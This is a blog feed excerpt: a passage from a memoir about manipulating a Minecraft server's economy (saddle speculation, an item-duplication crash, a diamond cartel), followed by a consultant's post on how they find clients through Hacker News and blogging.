&lt;p&gt;But that was us. Most people who set up buy chests, they were just begging for someone to take all their money. Few angles were more profitable or more reliable. No one was as good at it as me, in large part because I knew the entire market. Once or twice a day I'd stroll through the marketplace peeking in all the stores to see what changed. I didn't just know how much everything was worth, I knew every item every store bought and sold at what price and how much they had and how all those things had changed over time. To a reasonable degree of accuracy, anyway.&lt;/p&gt;
&lt;p&gt;Imagine: p-queue of every chest, prioritized by item importance, &quot;importance&quot; being some heuristic incorporating overall supply/demand, whether I personally needed it, what kind of margin I could expect to make flipping it, whose store it was, what kind of foot traffic that store got, which market it was in... few other things I suppose, it wasn't a system so much as a feeling. First few hundred chests in the queue I flat-out memorized. Next thousand or so I knew which store what item and around how much. All the rest I knew there was a store in a general area that bought or sold the item at a good bad or ok price. By &quot;all the rest&quot; I mean &lt;em&gt;all&lt;/em&gt;. At the height of it there was Market East, Market West, Market 2 (don't ask), Zel's Emporium, The Mall, and a couple dozen minor destinations in distant locales most players didn't even know about. Ballpark 16 chests/shop * 16 shops/row * 4 rows/market * 3 markets + Zel ~= 3200 chests and a couple thousand more in the hinterlands.&lt;/p&gt;
&lt;p&gt;Most of the people in the top tier I knew their stores better than they did. It wasn't uncommon, for instance, for Zel to tell someone in chat, &quot;I sell X item for P marbles,&quot; only for me to interject, &quot;You sell X for Q but you've been out of stock for a week. Market East, second left, third shop on the right sells for R.&quot; One time I caught someone who had been using a hopper to siphon emeralds out of one of Victoria's shop chests. I didn't witness it or anything, I just noticed her supply had steadily dropped over the course of a week at a rate that was highly unusual given how the emerald market normally flowed. Summoned a mod to check the history of the blocks underneath, and my suspicions were confirmed. Victoria hadn't realized anything was even missing.&lt;/p&gt;
&lt;p&gt;(A little while later someone scooped a beacon from me in the same manner; I'd since learned who did Victoria's shop, so I private messaged the likely culprit with a few choice words. They apologized profusely, swore to mend their ways... and a few hours later hoppered three beacons back to replace the one they took. A happy ending for all involved, I'd say. After this I replaced the blocks underneath my chests with locked furnaces.)&lt;/p&gt;
&lt;p&gt;Anyway. It's easy to cash out on buy chests when you know every shop on the server. And no one had more buy chests than Zel.&lt;/p&gt;
&lt;center readability=&quot;8&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/city-south-palace.png&quot; /&gt;&lt;p&gt;The largest structure in the inner city, a palace meant for reception of honored guests and scholar-officials. Similar in layout to a traditional siheyuan, though on a much grander scale. The front structure was more open to vistors (though of course access to the inner city was strictly controlled) while the ruler's living quarters were tucked behind. All in all I didn't leave myself enough space to do a full complex. If I were to do it again, I'd make the city much larger and worry less about leveling terrain (which ended up taking an incredible amount of time).&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;Ethics in Video Game Commercialism&lt;/h2&gt;
&lt;p&gt;Zel's Emporium was truly a wonderland. Three stories, couple hundred chests, and every item they sold, they also bought. From the same chest. In theory, the arbitrage business is a good one: set up your shops, keep an eye on the prices, collect free money off the spread with very little effort. The Emporium's stock was so diverse that it did plenty of business in both directions, and Zel had enough cash reserves to bounce back from most setbacks.&lt;/p&gt;
&lt;p&gt;Well, most. Let me tell you about lilypads. Lilypads gen on water in swamp biomes. Very common and fairly easy to gather but don't have much use besides decoration. People who wanted them usually just needed a handful to decorate a pond or two, people building in swamps only ever harvested them incidental to other activities, and most people didn't like to build in swamps anyway. Lilypads were garbage. Zel, being the long tail merchant that they were, sold them for 5M. Overpriced relative to their commonness in the world, but fine considering their scarcity in the market. One of their hundreds of tiny rivlets of income.&lt;/p&gt;
&lt;p&gt;Zel &lt;em&gt;bought&lt;/em&gt; lilypads for 3M. This was easily one of the most absurd prices I had &lt;em&gt;ever&lt;/em&gt; seen on the server for &lt;em&gt;anything&lt;/em&gt; and I spent days stripping swamp biome after swamp biome for the things just to take advantage of it. I emerged from the swamps and with no warning sold Zel around 3500 lilypads for just over 10000M. Zel later told me they knew the price was high but never in a million years thought anyone would be insane enough to do what I did.&lt;/p&gt;
&lt;p&gt;It sounds like I picked on Zel a lot. I really did like them and felt bad about abusing their store so much. Not bad enough not to do it though. Managing a couple hundred chests is hard as hell, and market conditions shifted prices faster than they could keep up. It became almost routine that I'd find something in the market Zel bought for more than the seller sold, buy it out, warp over, free money.&lt;/p&gt;
&lt;p&gt;Eventually, to my shock, I completely tapped them out. I didn't think it could be done--that they were always able to buy anything was the defining feature of the store, and their reserves seemed deep enough that I never thought I'd drain them. They widened their spreads even further, dropped their sale prices a bit, and tried to recoup. They still had huge stores of goods, so it's not like they were flat on their ass. They brought in a partner and revamped things a bit, and I even sent letters from time to time when they got a price so egregiously wrong that I felt it would be dishonorable to exploit.&lt;/p&gt;
&lt;p&gt;Obviously though, the game was up. I couldn't sell them anything if they had no money.&lt;/p&gt;
&lt;p&gt;...so I started running back-to-back transactions where I'd buy just enough of their valuable items to give them the precise number of marbles that I planned to reclaim by selling them junk. All's fair, y'know.&lt;/p&gt;
&lt;center readability=&quot;5&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/store-upstairs.png&quot; /&gt;&lt;p&gt;The upstairs of my shop. After a few weeks gathering for Emma to get myself established, I started keeping clay for myself. By time 1.6 came I had five or six doublechests and solid stocks of or supplychains for every dye. I was the only seller and did pretty well.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;Clays 'n Saddles&lt;/h2&gt;
&lt;p&gt;I don't think I can stress this enough: even if you suck at playing the market, even if you don't have much time to invest into the game, you can blow any virtual economy wide open just by reading the upcoming changes, predicting how those changes will shift supply/demand curves, and investing in items based on those predictions. Huge, complicated MMOs, it can often be hard to make accurate predictions without an encyclopedic knowledge of game mechanics. Often it's pretty simple though. People want cool shit.&lt;/p&gt;
&lt;p&gt;Minecraft 1.6 was colloquially known as The Horse Update. It added such things as:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Horses&lt;/li&gt;
&lt;li&gt;Hardened clay&lt;/li&gt;
&lt;li&gt;Coal blocks&lt;/li&gt;
&lt;li&gt;Stained clay&lt;/li&gt;
&lt;li&gt;Carpets&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;It was a popular topic of conversation on our 1.5 server for some time; we always got updates several months late since we needed to wait for Bukkit and our core plugins to update. (I'm not sure if things have changed since, but back then, every Minecraft update was a breaking one. Modders had to dump the jars every release and work from the decompiled artifacts directly. It is a testament to how enjoyable a game Minecraft is to play that it even has a mod community at all.) Here are all the new 1.6 features people on our server talked about:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Horses&lt;/li&gt;
&lt;li&gt;Horses&lt;/li&gt;
&lt;li&gt;Omg horses&lt;/li&gt;
&lt;li&gt;Guys I can't wait for horses&lt;/li&gt;
&lt;li&gt;Horses!!!!&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;To ride a horse you need a saddle. Prior to 1.6, saddles could only be used to ride pigs, and pigs are terrible mounts, so no one used them. Several shops stocked saddles at 20-30M. Some people sold for more, since saddles were uncraftable and pretty rare, but no one ever paid that much. For about a month leading up to 1.6, I bought any saddle I could find under 60M. In theory most players would only need one or two of the things, so I didn't want to spend absurd amounts on them. I ended up with several dozen, figured they'd go up to maybe 80-90M and I'd turn a decent profit.&lt;/p&gt;
&lt;p&gt;Then 1.6 hit and people absolutely lost their minds. Turns out, only a minority of players so excited about the horses had made sure to get ahold of a saddle in preparation for the patch. Most all of them just &lt;em&gt;assumed&lt;/em&gt; they could buy a saddle on patch day so why bother getting one early. Several rich players had stockpiled plenty but had zero intention of selling them. Every saddle in the market vanished within a matter of hours: 80M, 120M, 150M, it didn't matter, and after they were all gone, there was much wailing and gnashing of teeth. I knew the price would rise, but I didn't think it would rise &lt;em&gt;that&lt;/em&gt; high. You can usually get a saddle or two from a solid day of dungeon crawling. But no one wanted to go explore boring old dungeons. They wanted to ride horses, dammit.&lt;/p&gt;
&lt;p&gt;I placed a chest in the center of my main store, atop a nice little diamond block pedestal, selling one saddle, for 750M. Most people laughed at the price, some cursed my greed, plenty sent me private messages trying to haggle or find out if I had more. A few hours later, it sold. I let the chest sit empty until word got around, then put another saddle in it.&lt;/p&gt;
&lt;p&gt;All told I moved ten or twelve at 500-750M apiece, average profit per around 1000-2000%. The pricepoint proved unsustainable, but because of a rather mysterious supplier (which I will get to soon) I had a steady stream of saddles that I could sell quite briskly at a modest markup. People were starting to pour hours into extracting the things from dungeons too, hoping to cash in on market conditions they didn't realize had already evaporated. But I managed to outsell them anyway, even as they tried to compete on price, because I had something they didn't: horses.&lt;/p&gt;
&lt;center readability=&quot;7&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/horse-farm.png&quot; /&gt;&lt;p&gt;My horse farm. I considered at one point digging out a space underneath to build a track on which to clock their run speeds. Never ended up doing it, though, because aside from Emma, no one actually cared how fast the horses were.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;Horse of a Different Color&lt;/h2&gt;
&lt;p&gt;Normally, horses spawn naturally in grasslands, just like any other animal. But because we were on an old world, or because of a bug in some plugin we used, they didn't. So the admins sold horse eggs for 150M, single-use items normally unobtainable in survival that spawned a horse (90%) or donkey (10%). Horses came in seven colors and five patterns for a total of 35 different appearances, and people had &lt;em&gt;strong&lt;/em&gt; opinions about which one they wanted. Average players could afford one or two, but with such a low chance of getting what they wanted, many found themselves disappointed or else didn't even bother.&lt;/p&gt;
&lt;p&gt;I scouted out locations close to spawn (a difficult task given how overdeveloped the land was), eventually discovering a small mountain someone had built their home atop who &lt;em&gt;probably&lt;/em&gt; wouldn't notice or mind that overnight I'd hollowed it out and stuck a couple doors on the side. Set up pens with fences in my cavern under the mountain, bought fifteen or so eggs, popped them all and started breeding the output. Breeding took an item of negligible cost given to each horse and produced a foal with close to a 50-50 chance of inheriting one of the parents' colors and one of their patterns, with a very small chance of getting a random one instead. There's a cooldown of some minutes before they can be bred again. Foals can be raised into adults instantly by spamming them with wheat. It took a few days of cross-breeding and culling, but eventually I had 70 horses, two of each combination, separated into seven pens by color, along with a handful of donkeys and mules.&lt;/p&gt;
&lt;p&gt;I sold horses for 100M, two-thirds the price of an egg, but unlike the crapshoot that was, I could offer any style the buyer wanted, no risk and no wait. (And at zero marginal cost.) Buy a saddle with the horse and get an extra discount. This proved to be a nice side business for some time.&lt;/p&gt;
&lt;center readability=&quot;6&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/warehouse.png&quot; /&gt;&lt;p&gt;My warehouse, in the basement of the palace. The view from the opposite corner is much the same. Some of the ladders descend to more stacks of doublechests underneath. Organizing and labeling all of this is probably one of the most autistic things I've ever done. Though I'm pretty sure everything in this post qualifies.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;She Went to Jared&lt;/h2&gt;
&lt;h3&gt;Or, How I Learned to Stop Worrying and Love Catastrophic Economic Meltdown&lt;/h3&gt;
&lt;p&gt;So an interesting thing happened during the whole saddle episode. As I became well-known for having the only consistently available, if rather pricey, stock of the item, a player Charlotte messaged me asking if I'd like to buy more. They were selling rather briskly now, I was starting to run low, and especially since I was planning on getting into the horse business too, I needed a steady supplier. She'd sell me six or seven at a time for 50 or 60M, saying that was all she had, but whenever I went back, she had more. A bit strange but nothing too out of the ordinary. She had a few orbiters, so I figured maybe they were working together to excavate the things. Anyway, it was good for me.&lt;/p&gt;
&lt;p&gt;Then she opened her store in the far corner of the market. It was truly insane. Diamonds for 6M, when I sold for 20M and Emma for 23M. Emeralds for 5M, gold blocks for 3M. Wither skulls for 120M--three makes a beacon, and beacons sold for thousands when they could be got at all. Enormous quantities of everything, no one could have harvested all this if they spent years, and Charlotte was nowhere near a savvy enough player to have acquired it through the economy. And if she was, she wouldn't have been selling for those prices anyway.&lt;/p&gt;
&lt;p&gt;I went to one of the admins and told her someone had discovered a dupe glitch. She told me this was impossible. I explained the evidence, that it was the only likely explanation, that I didn't think anyone should be punished necessarily, but it should at least be corrected and the items deleted. She continued to insist that there was no way this could possibly happen. (She was a programmer herself, and as such probably should have known better.) Wary of being tagged an accomplice then, I asked if it should turn out that these items were in fact duped, would I be punished for trading in them. She assured me that no one would be banned for buying and selling in good faith.&lt;/p&gt;
&lt;p&gt;So I went to work.&lt;/p&gt;
&lt;p&gt;Diamonds being not the most valuable but certainly the most valued item in the game, both for their utility and their price stability, the server was littered with buy chests for them. These were mostly of the fling and a prayer sort, offering prices low enough that anyone selling to them was a noob or a fool. But not so low that I couldn't sell them Charlotte's. I bought from her all I could afford, bankrupted every single person who had a buy chest at any price, then went back for more. Buy chests in the market shops, scattered on the roadsides, nestled in secluded towns no one remembered the names of, I hit them all. If you were buying diamonds at the bottom of the ocean, I would find you and take all of your money.&lt;/p&gt;
&lt;p&gt;At the same time, I dropped my sell price in the market to 16M and did pretty good business for a few weeks. I had the advantage of one of the two best plots there were, the other belonging to Emma. (This I'd gotten via inside knowledge that Zel's to-be partner was shuttering his store and gifting the plot to a friend. I offered to swap my plot as the gift, help with the deconstruction process, and advise on pricing in the Emporium in exchange, thus getting the prized location without it ever going up for sale.) QuickShop provided a console command to show the closest shop selling an item, and these two plots, though behind hedge walls and not immediately visible, were the closest as the crow flies to the market's warp-in point. So anyone using the command--and this was most people, traipsing through the market looking for deals being a rare activity mostly limited to speculators--got directed to me or Emma for anything either of us sold.&lt;/p&gt;
&lt;p&gt;This all made me a &lt;em&gt;lot&lt;/em&gt; of money. I drove a portion of profits into bolstering my diamond and beacon reserves, bought basically any building material I thought I'd ever need in bulk, and still watched my marble balance grow. Up til the diamond bonanza, I'd been making money on a dozen different side hustles. A bit here, a bit there, doing better than most, but regardless the day-in day-out of working the market took up the majority of my time on the game. That made me rich; this is what made me wealthy.&lt;/p&gt;
&lt;p&gt;But soon 16M became 14M, and 14M became 12M. A few people started to notice Charlotte's store, and she restocked faster than I, or anyone, could recoup enough to buy out. Mostly though, it was clear to everyone the price of diamond was falling, even if they had no idea why. I diversified into selling enchanted diamond equipment of all types, priced just so that I could break even on the enchant and move the component diamonds at the same price I sold them for raw. A few of the buy chest people I'd tanked tried recovering some of their money by putting up at a loss the diamonds I'd sold them, but they still couldn't move product faster than a trickle. Eventually even Charlotte had to cut her prices to keep selling. It was bad.&lt;/p&gt;
&lt;p&gt;Not long after, the admin I'd spoken to before came back to me saying she discovered the dupe glitch, Charlotte was tempbanned and her items revoked, and it would be greatly appreciated if I could please turn over any diamonds I got from her that I had left in exchange for the price I'd paid so they may be destroyed. Of course I agreed. I'd made out like a bandit already, and at that point, like poor old JP Morgan during the Panic of 1907, was more concerned with the state of the economy as a whole, that left uncorrected it might render everything I now held worthless. (I did however neglect to mention the wither skulls.) I could not resist telling her I told her so.&lt;/p&gt;
&lt;p&gt;But the damage was done. The only reason you couldn't say the economy was in freefall was because all that remained was a stain on the ground. Many players who'd harvested and traded only did so to reduce the time they spent mining for diamond, and the game's equivalent of middle-class affluence was steady access to diamond tools. At first the abundance of diamond must have seemed like a boon to people who long had to struggle to get enough to sustain their needs. But mining diamonds to sell was also the primary way most knew to make money with which to buy building materials, thus the purchasing power of the vast majority plummeted alongside its price. (Diamonds are rare in the ground and as such have a Skinner box sort of reward-feedback loop when uncovered, which makes them for many players the most &lt;em&gt;enjoyable&lt;/em&gt; thing to farm. The things I did to make my first tens of thousands--digging clay out of riverbeds, gathering lilypads from swamps--were more lucrative but less exciting, and as such I was the only one who did them.)&lt;/p&gt;
&lt;p&gt;In this way, diamond was the linchpin of the entire system, so when its price bottomed out, everything else went with it. Nothing you could gather and sell was worth the money you'd get for it. And even if it was, nothing you'd want to buy with that money was available for purchase. Everyone on the server was reduced to subsistence, forced to harvest everything they might need. Even those of us with real money, once our stockpiles of raw materials started to dwindle, had to dig more out the dirt like a bunch of scrubs. The entire market was as illiquid as a Weichselian glacier.&lt;/p&gt;
&lt;p&gt;And then Samantha came back.&lt;/p&gt;
&lt;center readability=&quot;3&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/east-temple.png&quot; /&gt;&lt;p&gt;Temple to the ancestors, just east of the inner city.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;Gonna Buy With a Little Help From My Friends&lt;/h2&gt;
&lt;p&gt;Samantha, naturally, was horrified by the state of affairs upon her return. I mean, we all were. We thought the problem was just too massive to manage on our own, that the only thing we could do was keep playing the game and hope it worked itself out over time. Samantha didn't.&lt;/p&gt;
&lt;p&gt;Aside from our vast reserves of raw goods, Emma and I each had several hundred thousand marbles, Victoria a bit less, Samantha a bit more. Samantha intimated to us that she intended to spend her entire fortune clearing the market of diamond and that we should join her in this endeavor. What she understood immediately, which we were initially wary to gamble on, was that while it seemed like there was more diamond out there than anyone could buy, much of it was already in plain view. No one but us was holding onto &lt;em&gt;serious&lt;/em&gt; reserves, not like us, so all we had to do was shoulder the initial investment. We could swoop in and acquire all that there was to be had before anyone knew what was happening. They'd dump what they held once they saw there were buyers again, seeing it as a rare opportunity, not understanding our aim was to push the price past what we were paying. Then we'd become the primary suppliers for the server and quickly start making our money back, which we could then use to force up the prices of everything else. Anyway, the worst that could happen is we'd end up with too much of the most useful item in the game.&lt;/p&gt;
&lt;p&gt;We set up a private group on a messaging app and invited a half dozen or so other people. Zel, Lily, people with some amount of assets who we knew worked the market strategically and had a vested interest in dragging it back from the brink. Minor players by comparison to us four, but it was good to have everyone on the same page. Diamond was still in the 6M range; we decided the new price would be 18M.&lt;/p&gt;
&lt;p&gt;Samantha went first. She swept through the market buying out every single person with diamond to sell, then set up a buy chest at 12M and announced it to the server. People flocked to it, fighting to fill it up, and each time they did, she happily emptied it out so they could do it again. They all thought this was a windfall, a once in a lifetime shot to offload the accursed stones for more than they were worth, a boon offered by a wealthy eccentric just off a long break and looking to throw her fortune away. Soon enough, Samantha was tapped out, down to her last marble.&lt;/p&gt;
&lt;p&gt;We waited a few days for the people she'd bought out to restock, the people who thought they missed out to put all they had up for sale in the hopes that it might move after all. At the designated time, we all moved our price to 18M and picked up where she left off, snapping up anything less than that and ferreting it away for later. It took just about all the money we had. I was down below 10k for the first time since a couple months after I started playing, and I wasn't the only one. We barely managed to pull it off, but we did it.&lt;/p&gt;
&lt;p&gt;When it was just Samantha buying, it looked like an individual whim. Now that it was all of us, it was obvious to those paying attention that this was organized. But it didn't matter. By time people figured out they'd been had, we had all there was to be had. They went through their stages of grief, then they started buying from us again. Just like Samantha said.&lt;/p&gt;
&lt;p&gt;Rumors swirled about a cabal of players manipulating the market, abusing their wealth to force a change that everyone else could only go along with. We coyly denied the whole thing, a wink and a smile, &quot;Wow, wouldn't that be something if there was, hm?&quot; They called us the diamond cartel. We called ourselves the Minecraft Illuminati.&lt;/p&gt;
&lt;p&gt;Once we started making diamond money again, there was nothing that we couldn't do. No other item was duped so prolifically, and nothing available in comparable quantities came near its per-item cost. We were free to set the prices we pleased and had both the resources and the hubris to enforce them over any objection. Gold and coal up fivefold, wood and obsidian up ten. And every time we raised a price, our daily incomes went up higher.&lt;/p&gt;
&lt;p&gt;There were no restraints anymore. We could do whatever we wanted. It was our server. Everyone else was just playing on it.&lt;/p&gt;
&lt;center readability=&quot;2&quot;&gt;&lt;img class=&quot;img-box&quot; src=&quot;https://www.alicemaz.com/assets/img/minecraft/above-market.png&quot; /&gt;&lt;p&gt;View of the market district from above.&lt;/p&gt;
&lt;/center&gt;
&lt;h2&gt;A Whole New World&lt;/h2&gt;
&lt;p&gt;Eventually enough plugins updated for 1.7 that the admins decided it was time to update. This was known as the biome update, so named because it added dozens of new environment types and radically altered worldgen. Which meant that to take advantage of the new content, the server would be wiped, and everyone would start over.&lt;/p&gt;
&lt;p&gt;In an attempt to prevent a repeat of the previous world, where a tiny clique of players achieved dizzying wealth at the expense of all the others, some measures were put in place to stymie our ambitions. An aggressive tax, scaling to multiple percent per day, on anyone holding more than a few tens of thousands of marbles. I warned this would backfire, that it would lead to pervasive hoarding and diamond as de facto alternative money, wildly distorting the market all to avoid taxation. This is exactly what happened: the price of diamond shot up relative to everything else, chronic shortages meant most players couldn't buy it at all, and those of us making big trades preferred to denominate in it rather than the official currency. I considered even standardizing a redstone contraption that would dispense a selectable number of items for every diamond inserted in, but never got around to it.&lt;/p&gt;
&lt;p&gt;Meanwhile, in part to deal with the often intolerable lag of thousands of shop chests in one place, in part to reduce its grip on the daily flow of the game, the market was split up into four smaller areas. On the old server it had been one large, flat area, with square plots arranged in a grid, easy to browse and all conveniently located in one place. The new markets were pre-built structures laid out like model villages, with upstairs and downstairs, back entrances, none with the same layout, confusing to navigate and widely dispersed. Victoria came up with the idea of building our own market, that unlike the old server, we could build something with more utility than the official option and thus supplant it. We called it the Skymall: a pair of giant discs perched up at cloud level atop two massive pillars, shops arranged inside around their circumferences, connected by skybridge and easily accessible via nether portal just outside of spawn. Once we got established on the new server (which didn't take long) we plowed all our resources into this project for weeks. The Skymall opened to great fanfare; we sold out of storefronts within days, and it soon became the destination of choice for anyone heading to market.&lt;/p&gt;
&lt;p&gt;But none of it had the same savor. The joy of my first run was starting from zero, knowing nothing of the server and little of the game, building my knowledge graph, learning, experimenting, getting results. The diamond cartel was our most audacious gamble, but it was still an unknown until we pulled it off. On the new server, everything felt rote. I scouted out a skeleton spawner and built an experience grinder my first day or two, got my enchanted diamond, constructed a 50-furnace autosmelter and a passive iron farm. I felt as a dreary Harappan, building things I'd already built time and again, without any inventiveness, any spark.&lt;/p&gt;
&lt;p&gt;Once, when I wrote about all this in a different format, someone mentioned that online games don't necessarily have the same sort of stagnancy and barriers put up offline by entrenched, generational wealth. You can roll everyone back to zero and the selfsame people will get rich all over again. This is quite true. Part of it surely is many people don't like to play games the way we do. But much of it is you either have the time, skill, knowledge, and drive to work the angles and make your way to the top, or you don't. Making back our money wasn't just easy, it was trivial. Even with a leveled playing field, we raced ahead of everyone else. And then, one by one, we started to lose interest and drop off.&lt;/p&gt;
&lt;p&gt;There's a skill curve to games like Europa Universalis where you start off bewildered by the multitudes of inscrutable systems laid out in front of you. Over time you learn to manage them, and the game shifts from something that seems to happen to you, to something you can participate in and compete with. But eventually you learn it well enough to find the cracks. With so much complexity, there are always oversights, always gamebreaking tactics, ways to grind the AI into dust. You have complete control over the game world, can effect any end you want. And then it becomes about building a story.&lt;/p&gt;
&lt;p&gt;With Minecraft, with the economy, for us, there was no story to tell. There was only money.&lt;/p&gt;

<title>How I Find Consulting Clients</title>
<link>https://www.gkogan.co/blog/how-i-learned-to-get-consulting-leads/</link>
<guid isPermaLink="true" >https://www.gkogan.co/blog/how-i-learned-to-get-consulting-leads/</guid>
<description>&lt;p&gt;&lt;em&gt;(Updated December 2017 to reflect how my strategy for finding new consulting clients has evolved in the past few years. Sorry if some parts feel disjointed.)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I love consulting. I make a good living, I’m rewarded by seeing companies succeed—I’ve seen clients go through two acquisition exits, multiple million-dollar funding rounds, 10x growth in revenue, and more—and I get enough inquiries through this blog and referrals that I don’t face pipeline droughts.&lt;/p&gt;
&lt;p&gt;But getting to this point wasn’t easy. It took over a year to learn what works and what doesn’t, and I’m still improving my acquisition strategy five years on. In this article I’ll share practical tips I’ve learned along the way about finding consulting clients.&lt;/p&gt;
&lt;p&gt;First, a reminder that there’s an alternative:&lt;/p&gt;
&lt;h2 id=&quot;alternative-to-finding-new-consulting-clients&quot;&gt;Alternative to Finding New Consulting Clients&lt;/h2&gt;
&lt;p&gt;Although the focus of this article is finding new consulting leads and clients, remember that the best way to get new consulting business is from existing clients.&lt;/p&gt;
&lt;p&gt;Can you find ways to be valuable to your clients even after the first project? Are clients satisfied enough that they want to keep working with you? Are you charging a consulting fee that’s proportional to the value you’re providing?&lt;/p&gt;
&lt;p&gt;If you can answer “yes” to those, then there’s less pressure to constantly find new clients to remain at capacity, earn enough money, and have your choice of projects.&lt;/p&gt;
&lt;p&gt;If you answer “no” to any of those, then work on fixing those things while you’re also looking for new projects so that you’re not constantly looking for new work.&lt;/p&gt;
&lt;p&gt;Now, let’s begin…&lt;/p&gt;
&lt;h3 id=&quot;month-0&quot;&gt;Month 0&lt;/h3&gt;
&lt;p&gt;There was a long winter after I quit my job. Nevermind that it was summer—what followed was three months in which my savings depleted like the fat of a hibernating animal. I was to become an independent consultant.&lt;/p&gt;
&lt;p&gt;I spent those three months doing what I thought one does to find clients: network. I went to meetups every week and gave my elevator pitch to anyone who’d listen. It didn’t occur to me at the time that everyone else was there for the same reason. I was pitching marketing services to a lawyer who was pitching legal services to an MBA “ideas person” who was there to pitch ideas to a… It went on and on, and it was ridiculous.&lt;/p&gt;
&lt;h3 id=&quot;month-3&quot;&gt;Month 3&lt;/h3&gt;
&lt;p&gt;After three months, my savings were running low and I dreadfully considered going back to a normal job.&lt;/p&gt;
&lt;p&gt;Then, a &lt;a href=&quot;http://www.brianhonigman.com/&quot;&gt;friend&lt;/a&gt; I made at one of these meetups referred me to a startup that could use my help. A few calls and a meeting later, we had a deal.&lt;/p&gt;
&lt;p&gt;It didn’t lead to other clients, but I got two important things from that project: cash and confidence. It was enough money for another three months of runway.&lt;/p&gt;
&lt;p&gt;Maybe that was the formula, I thought; meet smart people and take time to form relationships. I spent the next two months taking that approach and it failed, too. The issue is painfully obvious in hindsight: founders don’t have time to schmooze at random meetups.&lt;/p&gt;
&lt;h3 id=&quot;month-6&quot;&gt;Month 6&lt;/h3&gt;
&lt;p&gt;Major progress doesn’t happen gradually, it happens in sudden leaps.&lt;/p&gt;
&lt;p&gt;The next leap came from an inconspicuous comment I made on &lt;a href=&quot;http://news.ycombinator.com&quot;&gt;Hacker News&lt;/a&gt;, which led to an email inquiry, which turned into a project, which turned into a long-term consulting relationship.&lt;/p&gt;
&lt;p&gt;Things were looking better (in that I had a monthly income), but I still needed to find a consistent and predictable method of getting clients.&lt;/p&gt;
&lt;p&gt;The positive outcome of my comment taught me two things:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Busy people—founders and CEOs—may not have time for meetups, but they sure as hell read Hacker News (or their industry's equivalent).&lt;/li&gt;
&lt;li&gt;Sales pitches are repulsive, but helpful information is attractive.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Thus my next experiment: blogging. Specifically, writing content that could be interesting to prospective clients.&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;em&gt;By the way, I write an article like this every month or so, covering lessons learned on B2B startup growth. Get an email update when the next one is published:&lt;/em&gt;&lt;/p&gt;

&lt;hr/&gt;&lt;h3 id=&quot;month-10&quot;&gt;Month 10&lt;/h3&gt;
&lt;p&gt;I published my &lt;a href=&quot;https://www.gkogan.co/blog/creating-new-business-model-cartoonists/&quot;&gt;first post&lt;/a&gt;—with help from &lt;a href=&quot;http://www.rwinslow.com/&quot;&gt;another friend&lt;/a&gt;—about a side project, and shared it on Hacker News on a Saturday morning in March of 2014.&lt;/p&gt;
&lt;p&gt;To my surprise, it received enough votes to get onto the front page and proceeded to receive ~7,500 unique visitors over the weekend. I thought to myself: If I can bring enough people to an article, some number of them may click through to the homepage, and a small percentage of those might become prospective clients.&lt;/p&gt;
&lt;p&gt;Although the majority of Hacker News readers are &lt;em&gt;not&lt;/em&gt; in a position to hire consultants and therefore would not &lt;em&gt;convert&lt;/em&gt; (ie, contact me about consulting), I only needed a handful of good prospects for this to be a success.&lt;/p&gt;
&lt;p&gt;That initial post had nothing to do with marketing, so I don’t think I got any consulting inquiries from it, but the volume of traffic was encouraging. I set out to write at least one new post per month.&lt;/p&gt;
&lt;p&gt;Getting to the front page of Hacker News is part substance and part chance, so I didn’t give up when my next two articles flopped, and kept writing.&lt;/p&gt;
&lt;h3 id=&quot;month-12&quot;&gt;Month 12&lt;/h3&gt;
&lt;p&gt;In June of 2014—a full year after I quit my job—I wrote about &lt;a href=&quot;https://www.gkogan.co/blog/stop-asking-me-to-sign-up/&quot;&gt;a lesson I learned&lt;/a&gt; from running an A/B experiment. It received 10,000 unique visits over 3 days. Two weeks later I published &lt;a href=&quot;https://www.gkogan.co/blog/ugly-ad-saved-business/&quot;&gt;another post&lt;/a&gt;; it received 15,000 unique visitors over 3 days.&lt;/p&gt;
&lt;p&gt;A small percentage of those readers clicked through to my consulting page, and a small percentage of &lt;em&gt;those&lt;/em&gt; contacted me for help. Within two weeks I was fully booked for the next six months. I broke through.&lt;/p&gt;
&lt;h3 id=&quot;lesson-learned-from-my-first-year-consulting&quot;&gt;Lesson Learned from My First Year Consulting&lt;/h3&gt;
&lt;p&gt;The strategy of blogging to fill the top of the funnel continues to be effective, for me &lt;em&gt;and&lt;/em&gt; my clients.&lt;/p&gt;
&lt;p&gt;But the conclusion isn’t that you should blog. The actionable lesson here—for companies, marketers, and consultants—is there’s no magic formula, so experiment faster until you find what works for you.&lt;/p&gt;
&lt;h2 id=&quot;how-i-get-consulting-clients-now&quot;&gt;How I Get Consulting Clients &lt;em&gt;Now&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;Over the next four years I continued to learn how to get more consulting projects and my strategy has changed slightly. Here is what I do now to grow &lt;a href=&quot;https://www.gkogan.co/&quot;&gt;my consulting business&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;Now that I get a steady stream of referrals, I focus on exceeding the objectives and expectations of every project I take on and then I make sure the person who made the introduction knows how well it went.&lt;/p&gt;
&lt;p&gt;This results in a win-win-win situation where all three parties involved have a positive outcome: The client gets a solution to their most pressing problem, the person who made the introduction gets credit for helping that company find a solution, and I get a great success story to tell.&lt;/p&gt;
&lt;p&gt;This creates a snowball effect: The next time the person who made an introduction meets someone with a similar challenge, they can refer me again and feel confident the problem will get solved. Meanwhile, the original client will call on me the next time they encounter a similar problem at their company or elsewhere.&lt;/p&gt;
